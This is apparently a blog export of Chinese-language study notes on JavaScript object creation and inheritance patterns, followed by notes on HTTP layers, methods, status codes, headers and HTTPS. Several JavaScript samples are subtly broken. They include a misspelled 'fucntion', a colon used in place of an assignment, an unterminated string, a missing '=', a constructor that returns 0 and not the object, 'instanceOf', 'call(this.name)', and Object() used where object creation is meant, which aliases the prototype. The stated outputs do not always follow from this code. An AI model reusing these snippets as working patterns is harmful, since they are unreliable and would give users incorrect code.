&quot;Nicholas&quot;,</span><br><span class="line">    age: 29,</span><br><span class="line">    job: &quot;Software Engineer&quot;,</span><br><span class="line">    sayName: function()&#123;</span><br><span class="line">        alert(this.name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">friends.sayName();   //error</span><br></pre></td></tr></table></figure><p>通过原生对象原型，可以取得所有默认方法的引用，而且也可以定义新方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">String.prototype.startsWith = function(text)&#123;</span><br><span class="line">    return this.indexOf(text) == 0;</span><br><span class="line">&#125;;</span><br><span class="line">var msg = &quot;Hello world&quot;;</span><br><span class="line">alert(msg.startsWith(&quot;Hello&quot;));   //true</span><br></pre></td></tr></table></figure><p>原生对象存在缺点，包含引用类型值的属性将被所有实例共享，例如属性中包含数组</p><h3 id="组合使用构造函数和原型模式"><a href="#组合使用构造函数和原型模式" class="headerlink" title="组合使用构造函数和原型模式"></a>组合使用构造函数和原型模式</h3><p>构造函数模式用于定义实例属性，而原型模式用于定义方法和共享的属性</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function Person(name,age,job)&#123;</span><br><span class="line">    this.name = name;</span><br><span class="line">    this.age = age;</span><br><span class="line">    this.job = job;</span><br><span class="line">    this.friends = [&quot;Shelly&quot;,&quot;Court&quot;];</span><br><span class="line">&#125;</span><br><span class="line">Person.prototype = &#123;</span><br><span class="line">    constructor: Person,</span><br><span class="line">    sayName: function()&#123;</span><br><span class="line">        alert(this.name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">var person1 = new Person(&quot;Nicholas&quot;,29,&quot;SoftWare Engineer&quot;);</span><br><span class="line">var person2 = new Person(&quot;Greg&quot;,27,&quot;Doctor&quot;);</span><br><span class="line">person1.friends.push(&quot;Van&quot;);</span><br><span class="line">alert(person1.friends);   //&quot;Shelly,Court,Van&quot;</span><br><span class="line">alert(person2.friends);   //&quot;Shelly,Court&quot;</span><br></pre></td></tr></table></figure><h3 id="动态原型模式"><a href="#动态原型模式" class="headerlink" title="动态原型模式"></a>动态原型模式</h3><p>通过检查某个应该存在的方法是否有效，来决定是否需要初始化原型</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function Person(name,age,job)&#123;</span><br><span class="line">    this.name = name;</span><br><span class="line">    this.age = age;</span><br><span class="line">    this.job = job;</span><br><span class="line">    if(typeof this.sayName != &quot;function&quot;)&#123;</span><br><span class="line">        Person.prototype.sayName = function()&#123;</span><br><span class="line">            alert(this.name);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="寄生构造函数模式"><a href="#寄生构造函数模式" class="headerlink" title="寄生构造函数模式"></a>寄生构造函数模式</h3><p>该模式用来为对象创建构造函数，以此创建一个具有额外方法的特殊对象</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function SpecialArray()&#123;</span><br><span class="line">    var values = new Array();</span><br><span class="line">    values.push.apply(values,arguments);</span><br><span class="line">    values.toPipedString = function()&#123;</span><br><span class="line">        return this.join(&quot;|);</span><br><span class="line">    &#125;;</span><br><span class="line">    return values;</span><br><span class="line">&#125;</span><br><span class="line">var colors = new SpecialArray(&quot;red&quot;,&quot;blue&quot;,&quot;green&quot;);</span><br><span class="line">alert(colors.toPipedString());    //&quot;red|blue|green&quot;</span><br></pre></td></tr></table></figure><h3 id="稳妥构造函数模式"><a href="#稳妥构造函数模式" class="headerlink" title="稳妥构造函数模式"></a>稳妥构造函数模式</h3><p>稳妥对象最适合在一些安全的环境中（这些环境中会禁止使用this和new）或者防止数据被其他应用程序（如Mashup程序）改动时使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function Person(name,age,job)&#123;</span><br><span class="line">    var o = new Object();</span><br><span class="line">    o.sayName = function()&#123;</span><br><span class="line">        alert(name);    //name只能通过sayName方法访问</span><br><span class="line">    &#125;;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h2><h3 id="原型链"><a href="#原型链" class="headerlink" title="原型链"></a>原型链</h3><p>实现原型链的基本模式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function SuperType()&#123;</span><br><span class="line">    this.property = true;</span><br><span class="line">&#125;</span><br><span class="line">SuperType.prototype.getSuperValue = function()&#123;</span><br><span class="line">    return this.property;</span><br><span class="line">&#125;;</span><br><span class="line">function SubType()&#123;</span><br><span class="line">    this.subproperty = false;</span><br><span class="line">&#125;</span><br><span class="line">SubType.prototype = new SuperType();</span><br><span class="line">SubType.prototype.getSubValue = function()&#123;</span><br><span class="line">    return this.subproperty;</span><br><span class="line">&#125;;</span><br><span class="line">var instance = new SubType();</span><br><span class="line">alert(instance.getSuperValue());   //true</span><br></pre></td></tr></table></figure><p><img src="../assets/jsoop/20190324225152.png" alt="Alt text"></p><p>以上代码中，可用instanceof和isPrototypeOf来确定原型和实例之间的关系</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">alert(instance instanceOf Object);   //true</span><br><span class="line">alert(instance instanceOf SuperType);   //true</span><br><span class="line">alert(instance instanceOf SubType);   //true</span><br><span class="line">alert(Object.prototype.isPrototypeOf(instance));   //true</span><br></pre></td></tr></table></figure><p>通过原型链实现继承时，不能使用对象字面量创建原型方法，因为这样会重写原型链，原型链中存在问题，包含引用类型值的原型属性会被所有实例共享</p><h3 id="借用构造函数"><a href="#借用构造函数" class="headerlink" title="借用构造函数"></a>借用构造函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">function SuperType()&#123;</span><br><span class="line">    this.colors: [&quot;red&quot;,&quot;blue&quot;,&quot;green&quot;];</span><br><span class="line">&#125;</span><br><span class="line">function SubType()&#123;</span><br><span class="line">    SuperType.call(this);   //执行了SuperType中定义的所有对象初始化代码</span><br><span class="line">&#125;</span><br><span class="line">var instance1 = new SubType();</span><br><span class="line">instance1.colors.push(&quot;black&quot;);</span><br><span class="line">alert(instance1.colors);   //&quot;red,blue,green,black&quot;</span><br><span class="line">var instance2 = new SubType();</span><br><span class="line">alert(instance2.colors);   //&quot;red,blue,green&quot;</span><br><span class="line"></span><br><span class="line">// 还可以传递参数</span><br><span class="line">function SuperType(name)&#123;</span><br><span class="line">    this.name = name;</span><br><span class="line">&#125;</span><br><span class="line">function SubType()&#123;</span><br><span class="line">    SuperType.call(this,&quot;Nicholas&quot;);</span><br><span class="line">    this.age = 29;</span><br><span class="line">&#125;</span><br><span class="line">var instance = new SubType();</span><br><span class="line">alert(instance.name);   //&quot;Nicholas&quot;</span><br><span class="line">alert(instance.age);   //29</span><br></pre></td></tr></table></figure><p>如同仅仅借用构造函数，则无法函数复用</p><h3 id="组合继承"><a href="#组合继承" class="headerlink" title="组合继承"></a>组合继承</h3><p>使用原型链实现对原型属性和方法的继承，通过借用构造函数实现对实例的继承</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">function SuperType(name)&#123;</span><br><span class="line">    this.name = name;</span><br><span class="line">    this.colors = [&quot;red&quot;,&quot;blue&quot;,&quot;green&quot;];</span><br><span class="line">&#125;</span><br><span class="line">SuperType.prototype.sayName = function()&#123;</span><br><span class="line">    alert(this.name);</span><br><span class="line">&#125;</span><br><span class="line">function SubType(name,age)&#123;</span><br><span class="line">    SuperType.call(this,name);    //继承属性</span><br><span class="line">    this.age = age;</span><br><span class="line">&#125;</span><br><span class="line">SubType.prototype = new SuperType();   //继承方法</span><br><span class="line">SubType.prototype.constructor = SubType;</span><br><span class="line">SubType.prototype.sayAge = function()&#123;</span><br><span class="line">    alert(this.age);</span><br><span class="line">&#125;;</span><br><span class="line">var instance1 = new SubType(&quot;Nicholas&quot;,29);</span><br><span class="line">instance1.colors.push(&quot;black&quot;);</span><br><span class="line">alert(instance1.colors);   //&quot;red,blue,green,black&quot;</span><br><span class="line">instance1.sayName();   //&quot;Nicholas&quot;</span><br><span class="line">instance1.sayAge();   //29</span><br><span class="line">var instance2 = new SubType(&quot;Greg&quot;,27);</span><br><span class="line">alert(instance2.colors);   //&quot;red,blue,green&quot;</span><br><span class="line">instance2.sayName();   //&quot;Greg&quot;</span><br><span class="line">instance2.sayAge();   //27</span><br></pre></td></tr></table></figure><h3 id="原型式继承"><a href="#原型式继承" class="headerlink" title="原型式继承"></a>原型式继承</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var person = &#123;</span><br><span class="line">    name: &quot;Nicholas&quot;,</span><br><span class="line">    friends: [&quot;Shelby&quot;,&quot;Court&quot;,&quot;Van&quot;]</span><br><span class="line">&#125;;</span><br><span class="line">var anotherPerson  Object(person);</span><br><span class="line">anotherPerson.name = &quot;Greg&quot;;</span><br><span class="line">anotherPerson.friends.push(&quot;Rob&quot;);</span><br><span class="line">var getAnotherPerson = Object(person);</span><br><span class="line">getAnotherPerson.name = &quot;Linda&quot;;</span><br><span class="line">getAnotherPerson.friends.push(&quot;Barbie&quot;);</span><br><span class="line">alert(person.friends);   //&quot;Shelby,Court,Van,Rob,Barbie&quot;</span><br></pre></td></tr></table></figure><p>ES5新增Object.create()方法规范化了原型式继承，在传入一个参数时与Object方法相同</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var person = &#123;</span><br><span class="line">    name: &quot;Nicholas&quot;,</span><br><span class="line">    friends: [&quot;Shelby&quot;,&quot;Court&quot;,&quot;Van&quot;]</span><br><span class="line">&#125;;</span><br><span class="line">var anotherPerson = Object.create(person,&#123;</span><br><span class="line">    name: &#123;</span><br><span class="line">        value: &quot;Greg&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line">alert(anotherPerson.name);   //&quot;Greg&quot;</span><br></pre></td></tr></table></figure><h3 id="寄生式继承"><a href="#寄生式继承" class="headerlink" title="寄生式继承"></a>寄生式继承</h3><p>创建一个仅用于封装继承过程的函数，该函数在内部以某种方式来增强对象</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function createAnother(original)&#123;</span><br><span class="line">    var clone = Object(original);   //创建一个新对象，Object函数不是必需的</span><br><span class="line">    clone.sayHi = function()&#123;</span><br><span class="line">        alert(&quot;Hi&quot;);</span><br><span class="line">    &#125;;</span><br><span class="line">    return clone;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="寄生组合继承"><a href="#寄生组合继承" class="headerlink" title="寄生组合继承"></a>寄生组合继承</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">fucntion inheritP(subType,superType)&#123;</span><br><span class="line">    var prototype = Object(superType.prototype);</span><br><span class="line">    prototype.constructor = subType;</span><br><span class="line">    subType.prototype = prototype;</span><br><span class="line">&#125;</span><br><span class="line">function SuperType(name)&#123;</span><br><span class="line">    this.name = name;</span><br><span class="line">    this.colors = [&quot;red&quot;,&quot;blue&quot;,&quot;green&quot;];</span><br><span class="line">&#125;</span><br><span class="line">SuperType.prototype.sayName = function()&#123;</span><br><span class="line">    alert(this.name);</span><br><span class="line">&#125;;</span><br><span class="line">function SubType(name,age)&#123;</span><br><span class="line">    SuperType.call(this.name);</span><br><span class="line">    this.age = age;</span><br><span class="line">&#125;</span><br><span class="line">inheritP(SubType,SuperType);</span><br><span class="line">SubType.prototype.sayAge = function()&#123;</span><br><span class="line">    alert(this.age);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTTP原理</title>
      <link href="/HTTP%E5%8E%9F%E7%90%86.html"/>
      <url>/HTTP%E5%8E%9F%E7%90%86.html</url>
      
        <content type="html"><![CDATA[<h2 id="TCP-IP协议族"><a href="#TCP-IP协议族" class="headerlink" title="TCP/IP协议族"></a>TCP/IP协议族</h2><h3 id="重要思想-分层"><a href="#重要思想-分层" class="headerlink" title="重要思想:分层"></a>重要思想:<code>分层</code></h3><h3 id="分层："><a href="#分层：" class="headerlink" title="分层："></a>分层：</h3><ul><li>应用层：<blockquote><p>HTTP协议：生成针对目标web服务器的HTTP请求报文。<br>FTP协议：文件传输协议。<br>DNS协议： 域名解析协议。</p></blockquote></li></ul><a id="more"></a><ul><li>传输层：<blockquote><p>UDP协议：用户数据报协议。<br>TCP协议：传输控制协议：利用三次握手策略。<br><img src="../assets/http/tcp3handmake.gif" alt="Alt text"></p></blockquote></li></ul><ul><li><p>网络层:</p><blockquote><p>IP协议：把各种数据包传送给对方。<br>ARP协议：解析地址协议，通过IP地址查出对应MAC地址。</p></blockquote></li><li><p>链路层：用于处理网络的硬件部分。</p></li></ul><h2 id="URI-URL"><a href="#URI-URL" class="headerlink" title="URI/URL"></a>URI/URL</h2><ul><li>URI：用字符串标识某一互联网资源。</li><li>URL： 互联网上所处的位置表示资源地点。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://user:pass@wwww.example.com:80/dir/index.html?uid=1#ch1</span><br></pre></td></tr></table></figure></li></ul><table><thead><tr><th style="text-align:center">组成</th><th style="text-align:center">解释</th></tr></thead><tbody><tr><td style="text-align:center">https</td><td style="text-align:center">协议方案</td></tr><tr><td style="text-align:center">user:pass</td><td style="text-align:center">登录信息</td></tr><tr><td style="text-align:center">wwww.example.com</td><td style="text-align:center">服务器地址</td></tr><tr><td style="text-align:center">:80</td><td style="text-align:center">端口号</td></tr><tr><td style="text-align:center">dir/index.html</td><td style="text-align:center">文件路径</td></tr><tr><td style="text-align:center">uid=1</td><td style="text-align:center">查询字符串</td></tr><tr><td style="text-align:center">#ch1</td><td style="text-align:center">片段标识符</td></tr></tbody></table><h2 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h2><h3 id="请求响应："><a href="#请求响应：" class="headerlink" title="请求响应："></a>请求响应：</h3><ul><li><p>请求报文：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST    /from/entry   HTTP/1.1</span><br><span class="line">Host: hacker.jp</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 16</span><br><span class="line">name: ueno&amp;age=37</span><br></pre></td></tr></table></figure></li><li><p>响应报文：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1  200  OK</span><br><span class="line">Date: Tue, 10 Jul 2012 06:50:15 GMT</span><br><span class="line">Content-Length: 362</span><br><span class="line">Content-Type: text/html</span><br><span class="line">&lt;html&gt; ......</span><br></pre></td></tr></table></figure></li></ul><h3 id="HTTP可使用方法："><a href="#HTTP可使用方法：" class="headerlink" title="HTTP可使用方法："></a>HTTP可使用方法：</h3><ul><li>GET：获取资源，目的是获取响应的主体内容。</li><li>POST：传输实体主体。</li><li>PUT：传输文件，要求在请求报文中包含文件内容，保存到请求URI指定位置。</li><li>HEAD：获取报文首部，用于确认URI有效性及资源更新的日期时间。</li><li>DELETE：删除文件，删除URI指定资源。</li><li>OPTIONS：询问支持的方法，查询针对请求URI指定资源支持的方法。</li><li>TRACE：追踪路径，用来确认连接过程中发生的一系列操作。</li><li>CONNECT：要求用隧道协议连接代理。</li></ul><h3 id="状态码："><a href="#状态码：" class="headerlink" title="状态码："></a>状态码：</h3><ul><li>状态码类别：</li></ul><table><thead><tr><th style="text-align:center">状态码</th><th style="text-align:center">分类</th><th style="text-align:center">解释</th></tr></thead><tbody><tr><td style="text-align:center">1xx</td><td style="text-align:center">Infromational(信息性状态码)</td><td style="text-align:center">接收的请求正在处理</td></tr><tr><td style="text-align:center">2xx</td><td style="text-align:center">Success(成功状态码)</td><td style="text-align:center">请求正常处理完成</td></tr><tr><td style="text-align:center">3xx</td><td style="text-align:center">Redirectiion(重定向状态码)</td><td style="text-align:center">需要进行附加操作以完成请求</td></tr><tr><td style="text-align:center">4xx</td><td style="text-align:center">Client Error(客户端错误状态码)</td><td style="text-align:center">服务器无法处理请求</td></tr><tr><td style="text-align:center">5xx</td><td style="text-align:center">Server Error(服务器错误状态码)</td><td style="text-align:center">服务器处理请求出错</td></tr></tbody></table><ul><li>常用状态码：</li></ul><table><thead><tr><th style="text-align:left">状态码</th><th style="text-align:left">解释</th></tr></thead><tbody><tr><td style="text-align:left">200 OK</td><td style="text-align:left">从客户端发来的请求在服务端被正常处理了</td></tr><tr><td style="text-align:left">204 No Content</td><td style="text-align:left">服务器接受的请求已成功处理，但返回的响应报文不含实体主体</td></tr><tr><td style="text-align:left">206 Partial Content</td><td style="text-align:left">客户端进行了范围请求</td></tr><tr><td style="text-align:left">301 Moved Permanently</td><td style="text-align:left">永久性重定向</td></tr><tr><td style="text-align:left">302 Found</td><td style="text-align:left">临时性重定向，请求的资源已被分配了新的URI</td></tr><tr><td style="text-align:left">303 See Other</td><td style="text-align:left">与302有着相同功能，但明确要求采用GET获取资源</td></tr><tr><td style="text-align:left">304 Not Modified</td><td style="text-align:left">客户端发送附带条件请求时，服务端允许请求访问，但未满足条件</td></tr><tr><td style="text-align:left">307 Temporary Redirect</td><td style="text-align:left">与302有相同含义，但不会使POST变成GET</td></tr><tr><td style="text-align:left">400 Bad Request</td><td style="text-align:left">请求报文种存在语法错误</td></tr><tr><td style="text-align:left">401 Unauthorized</td><td style="text-align:left">需通过HTTP认证，若已进行过一次请求，则表示认证失败</td></tr><tr><td style="text-align:left">403 Forbidden</td><td style="text-align:left">请求资源的访问被服务器拒绝</td></tr><tr><td style="text-align:left">404 Not Found</td><td style="text-align:left">服务器上无法找到请求的资源</td></tr><tr><td style="text-align:left">500 Internal Server Error</td><td style="text-align:left">服务器端在执行请求时发生了错误</td></tr><tr><td style="text-align:left">503 Service Unavailable</td><td style="text-align:left">服务器暂处于超负载或正在进行停机维护，无法处理请求</td></tr></tbody></table><h3 id="通信数据转发程序："><a href="#通信数据转发程序：" class="headerlink" title="通信数据转发程序："></a>通信数据转发程序：</h3><h4 id="代理："><a href="#代理：" class="headerlink" title="代理："></a>代理：</h4><ul><li>作用：接收由客户端发送的请求并转发给服务器，接收服务器相应转发给客户端，转发时，需要附加Via首部字段以标记出经过的主机信息。</li><li>使用理由：<blockquote><p>利用缓存技术减少网络带宽的流量<br>组织内部针对特定网站的访问控制<br>以获取访问日志为主要目的</p></blockquote></li><li>分类：<blockquote><p>缓存代理：会预先将资源的副本保存在代理服务器<br>透明代理：不对报文做任何加工的代理类型为透明代理</p></blockquote></li></ul><h4 id="网关："><a href="#网关：" class="headerlink" title="网关："></a>网关：</h4><ul><li>作用：工作机制和代理十分相似，而网关能使通信线路上的服务器提供非HTTP协议。</li></ul><h4 id="隧道："><a href="#隧道：" class="headerlink" title="隧道："></a>隧道：</h4><ul><li>作用：建立一条与其他服务器通信的线路，确保客户端能与服务器进行安全的通信。</li></ul><h3 id="HTTP首部字段："><a href="#HTTP首部字段：" class="headerlink" title="HTTP首部字段："></a>HTTP首部字段：</h3><h4 id="类型："><a href="#类型：" class="headerlink" title="类型："></a>类型：</h4><ul><li>通用首部字段：请求报文和响应报文两方都会使用的首部</li><li>请求首部字段：请求报文使用的首部</li><li>响应首部字段：响应报文使用的首部</li><li>实体首部字段：补充了资源内容更新时间等实体有关的信息</li></ul><h4 id="End-to-end首部和Hop-to-hop首部："><a href="#End-to-end首部和Hop-to-hop首部：" class="headerlink" title="End-to-end首部和Hop-to-hop首部："></a>End-to-end首部和Hop-to-hop首部：</h4><ul><li>端到端首部(End-to-end)：分在此类的首部会转发给请求/想一个的最终接受目标。</li><li>逐跳首部(Hop-to-hop)：分在此类的首部支队单词转发有效，会因通过缓存代理不转发。</li></ul><h4 id="通用首部字段："><a href="#通用首部字段：" class="headerlink" title="通用首部字段："></a>通用首部字段：</h4><ul><li>Cache-Control：操作缓存的工作机制</li><li>Connection：控制不再转发给代理的首部字段，管理持久连接</li><li>Date：表明创建HTTP报文的日期和时间</li><li>Pragma：要求所有的中间服务器不返回缓存的资源</li><li>Trailer：事先说明在报文主体后记录了哪些首部字段，可应用于分块传输编码</li><li>Upgrade：用于检测HTTP协议及其协议是否可使用更高的版本进行通信</li><li>Via：追踪客户端与服务器之间的请求和响应报文的传输路径</li><li>Warning:HTTP/1.0：响应首部演变过来，通常会告知用户一些与缓存相关的问题的警告</li></ul><h4 id="请求首部字段："><a href="#请求首部字段：" class="headerlink" title="请求首部字段："></a>请求首部字段：</h4><ul><li>Accept：通知服务器用户代理可处理的媒体类型及媒体类型的相对优先级顺序</li><li>Accept-Charset：通知服务器用户代理支持的字符集及字腹肌的相对优先级顺序</li><li>Accept-Encoding：通知服务器用户代理支持的内容编码及内容编码的相对优先级顺序</li><li>Accept-Language：通知服务器用户代理支持的自然语言集及其相对优先级顺序</li><li>Authorization：通知服务器用户代理的认证信息</li><li>Expect：期望出现某种特定行为，服务器无法理解作出回应时，返回417 Expectation Failed</li><li>From：使用用户代理的用户的电子邮件地址</li><li>Host：请求资源所处的互联网主机名和端口号</li><li>If-Match：匹配资源所用的实体标记值</li><li>If-Modified-Since：请求指定日期后更新过的资源</li><li>If-None-Match：当实体标记(Etag)与请求资源的Etag不一致时，处理请求</li><li>If-range：If-range字段值若是和Etag值的更新日期时间一致，则做范围请求处理</li><li>If-Unmodified-Since：请求在指定日期后未发生更新的资源</li><li>Max-Forwards：指定可经过的服务器最大数目</li><li>Proxy-Authorization：通知服务器认证所需要的信息</li><li>Range：通知服务器资源的指定范围</li><li>Referer：通知服务器请求的原始资源的URI</li><li>TE：通知服务器客户端能够处理响应的传输编码方式及其相对优先级顺序</li><li>User-Agent：将创建请求的浏览器和用户代理名称等信息传输给服务器</li></ul><h4 id="响应首部字段："><a href="#响应首部字段：" class="headerlink" title="响应首部字段："></a>响应首部字段：</h4><ul><li>Accept-Ranges：用来告知客户端服务器是否能处理范围请求</li><li>Age：告知客户端源服务器在多久前创建了响应，单位为妙</li><li>Etag：告知客户端实体标记，可将资源以字符串形式做唯一性标识的方式</li><li>Location：将响应接收方引导至某个与请求URI位置不同的资源</li><li>Proxy-Authenticate：把由代理服务器所要求的的认证信息发送给客户端</li><li>Retry-After：告知客户端在多久之后再次发送请求</li><li>Server：告知客户端当前服务器上安装的HTTP服务器应用程序的信息</li><li>Vary：可对缓存进行控制</li><li>www-Authenticate：告知客户端适用于访问请求URI所指定资源的认证方案</li></ul><h4 id="实体首部字段："><a href="#实体首部字段：" class="headerlink" title="实体首部字段："></a>实体首部字段：</h4><ul><li>Allow：通知客户端能够支持Request-URI制定资源的所有HTTP方法</li><li>Content-Encoding：告知客户端服务器对实体的主体部分选用的内容编码方式</li><li>Content-Language：告知客户端实体主体使用的自然语言</li><li>Content-Length：表明了实体主体部分的大小</li><li>Content-Location：与报文主体部分相对应的URI</li><li>Content-MD5：检查报文主体在传输过程中是否保持完整，以及确认传输到达</li><li>Content-Range：告知客户端作为响应返回的实体的哪个部分符合范围请求</li><li>Content-Type：说明了实体主体内对象的媒体类型</li><li>Expires：将资源失效的日期告知客户端</li><li>Last-Modified：指明资源最终修改的时间</li></ul><h4 id="为Cookie服务的首部字段："><a href="#为Cookie服务的首部字段：" class="headerlink" title="为Cookie服务的首部字段："></a>为Cookie服务的首部字段：</h4><ul><li><p>Set-Cookie：</p><blockquote><p>expires属性：指定浏览器可发送Cookie的有效期<br>path属性：限制指定Cookie的发送范围的文件目录<br>domain属性：作为Cookie适用对象的域名<br>secure属性：仅在HTTPS安全通信时才会发送Cookie<br>HttpOnly属性：加以限制，使Cookie不能被JavaScript脚本访问</p></blockquote></li><li><p>Cookie：当客户想获得HTTP状态管理支持时，就会在请求中包含从服务器接受的Cookie</p></li></ul><h4 id="其他首部字段："><a href="#其他首部字段：" class="headerlink" title="其他首部字段："></a>其他首部字段：</h4><ul><li>X-Frame-Options：用于控制网站内容在其他Web网站的Frame标签内的现实问题，防止点击劫持攻击</li><li>X-XSS-Protection：针对跨站脚本攻击(XSS)的一种对策，用于控制浏览器XSS防护机制的开关</li><li>DNT：意为拒绝个人信息被收集，表示拒绝被精准广告追踪的一种方法</li><li>P3P：利用P3P技术让Web网站上的个人隐私变成一种仅供程序可理解的形式</li></ul><h2 id="HTTP和HTTPS"><a href="#HTTP和HTTPS" class="headerlink" title="HTTP和HTTPS"></a>HTTP和HTTPS</h2><h3 id="HTTP的缺点："><a href="#HTTP的缺点：" class="headerlink" title="HTTP的缺点："></a>HTTP的缺点：</h3><ul><li>通信使用明文(不加密)，内容可能会被窃听</li><li>不验证通信方的身份，因此有可能遭遇伪装</li><li>无法证明报文的完整性，所以有可能已遭篡改</li></ul><h3 id="HTTPS："><a href="#HTTPS：" class="headerlink" title="HTTPS："></a>HTTPS：</h3><h4 id="定义："><a href="#定义：" class="headerlink" title="定义："></a>定义：</h4><ul><li>HTTPS实在HTTP通信接口部分用SSL和TLS协议代替</li><li>添加了加密及认证机制的HTTP成为HTTPS</li></ul><h4 id="安全通信机制："><a href="#安全通信机制：" class="headerlink" title="安全通信机制："></a>安全通信机制：</h4><p><img src="../assets/http/httpsProcess.jpg" alt="Alt text"></p><h3 id="HTTP认证："><a href="#HTTP认证：" class="headerlink" 